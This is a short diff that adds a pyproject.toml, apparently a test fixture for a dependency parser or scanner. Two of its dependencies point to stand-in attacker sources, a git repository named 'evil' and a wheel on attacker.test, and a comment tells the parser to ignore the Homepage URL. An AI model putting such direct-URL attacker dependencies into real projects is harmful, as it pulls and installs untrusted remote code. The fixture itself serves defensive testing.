@@ -1,0 +1,12 @@
+[project]
+name = "dep-bootstrap"
+version = "1.0.0"
+dependencies = [
+  "evil @ git+https://github.com/attacker/evil.git@main",
+  "art @ https://attacker.test/art-1.0-py3-none-any.whl",
+  "chalk",
+]
+
+[project.urls]
+# A metadata URL — section-aware parse must NOT read this as a dependency source.
+Homepage = "https://github.com/attacker/evil"
